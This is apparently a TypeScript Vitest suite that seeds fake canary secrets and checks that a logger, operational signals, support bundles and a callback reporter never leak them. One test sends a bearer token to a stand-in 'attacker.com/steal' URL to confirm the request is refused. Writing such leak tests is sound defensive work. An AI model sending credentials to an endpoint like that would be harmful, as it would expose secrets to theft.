import { describe, expect, it } from "vitest"
import { StructuredLogger } from "../../src/observability/logger.js"
import { collectOperationalSignals } from "../../src/observability/signals.js"
import { CallbackReporter } from "../../src/callback/reporter.js"
import { generateSupportBundle, previewSupportBundle } from "../../src/diagnostics/index.js"

const CANARY_BEARER_TOKEN = "CANARY_SECRET_TOKEN_DO_NOT_LEAK_XYZ123_SECRET"
const CANARY_NODE_KEY = "CANARY_NODE_PRIVATE_KEY_999888777_DO_NOT_DISCLOSE"
const CANARY_ENV_PASS = "CANARY_SUPER_SECRET_PASSWORD_ALPHA_BETA"

describe("M8.3 / M7-C2: Canary Token and Secret Leak Audit", () => {
  it("never leaks seeded canary secrets in structured log entries or attributes", () => {
    const emittedLines: string[] = []
    const logger = new StructuredLogger({
      writer: (line) => emittedLines.push(line),
      customSecrets: [CANARY_BEARER_TOKEN, CANARY_NODE_KEY, CANARY_ENV_PASS],
    })

    // Log various events attempting to leak secrets
    logger.info("ingress.admitted", {
      jobId: "job-audit-1",
      attributes: {
        authorizationHeader: `Bearer ${CANARY_BEARER_TOKEN}`,
        nodeKey: CANARY_NODE_KEY,
        password: CANARY_ENV_PASS,
        nested: {
          token: CANARY_BEARER_TOKEN,
          rawSecret: `connecting with ${CANARY_NODE_KEY} now`,
        },
      },
    })

    logger.error("ingress.rejected", {
      errorCode: "AUTH_FAILED",
      attributes: {
        attemptedToken: CANARY_BEARER_TOKEN,
        secretEnv: CANARY_ENV_PASS,
      },
    })

    expect(emittedLines.length).toBe(2)
    const combinedLog = emittedLines.join("\n")

    // The canary secrets MUST NEVER appear in emitted logs
    expect(combinedLog.includes(CANARY_BEARER_TOKEN)).toBe(false)
    expect(combinedLog.includes(CANARY_NODE_KEY)).toBe(false)
    expect(combinedLog.includes(CANARY_ENV_PASS)).toBe(false)

    // Redacted placeholders should appear instead
    expect(combinedLog.includes("[REDACTED_SECRET]") || combinedLog.includes("[REDACTED_CANARY_SECRET]")).toBe(true)
  })

  it("never includes seeded bearer tokens or credentials in operational signals", async () => {
    const signals = await collectOperationalSignals({
      nodeId: "node-canary-test",
      nodeHealth: "healthy",
      leaseTimeRemainingMs: 30000,
      epoch: 1,
    })

    const serializedSignals = JSON.stringify(signals)
    expect(serializedSignals.includes(CANARY_BEARER_TOKEN)).toBe(false)
    expect(serializedSignals.includes(CANARY_NODE_KEY)).toBe(false)
    expect(serializedSignals.includes(CANARY_ENV_PASS)).toBe(false)
  })

  it("never forwards bearer token to unlisted origins in CallbackReporter (F-02 / M8.3)", async () => {
    let capturedHeader: string | undefined
    const reporter = new CallbackReporter({
      attempts: 1,
      baseDelayMs: 1,
      agents: [{ id: "dev-main", url: "http://dev-main.tailnet:8787" }],
      fetcher: async (_url, init) => {
        capturedHeader = (init?.headers as Record<string, string>)?.Authorization
        return new Response(null, { status: 200 })
      },
    })

    const report = {
      job_id: "job-sec-1",
      source_agent_id: "test",
      target_agent_id: "dev-main",
      status: "completed" as const,
      summary: "ok",
      findings: [],
      artifacts: [],
      started_at: "2026-01-01T00:00:00.000Z",
      completed_at: "2026-01-01T00:01:00.000Z",
    }

    // 1. Authorized destination receives bearer token
    await reporter.send("http://dev-main.tailnet:8787/report", report, CANARY_BEARER_TOKEN)
    expect(capturedHeader).toBe(`Bearer ${CANARY_BEARER_TOKEN}`)

    // 2. Unauthorized origin throws before any header is constructed
    capturedHeader = undefined
    await expect(
      reporter.send("http://attacker.com/steal", report, CANARY_BEARER_TOKEN),
    ).rejects.toThrow()
    expect(capturedHeader).toBeUndefined()
  })

  it("never includes seeded secrets in generated support bundles or previews (M8.4)", () => {
    const bundle = generateSupportBundle(
      {
        profile: "audit-profile",
        customSecrets: [CANARY_BEARER_TOKEN, CANARY_NODE_KEY, CANARY_ENV_PASS],
      },
      {
        routerVersion: "0.1.0",
        loggerErrors: [
          {
            timestamp: "2026-10-01T10:00:00.000Z",
            level: "error",
            event: "ingress.rejected",
            errorCode: "AUTH_FAILED",
            attributes: {
              attemptedSecret: CANARY_BEARER_TOKEN,
              nodePrivate: CANARY_NODE_KEY,
              envSecret: CANARY_ENV_PASS,
            },
          },
        ],
      },
    )

    const bundleJson = JSON.stringify(bundle)
    expect(bundleJson.includes(CANARY_BEARER_TOKEN)).toBe(false)
    expect(bundleJson.includes(CANARY_NODE_KEY)).toBe(false)
    expect(bundleJson.includes(CANARY_ENV_PASS)).toBe(false)

    const preview = previewSupportBundle(bundle)
    expect(preview.includes(CANARY_BEARER_TOKEN)).toBe(false)
    expect(preview.includes(CANARY_NODE_KEY)).toBe(false)
    expect(preview.includes(CANARY_ENV_PASS)).toBe(false)
  })
})
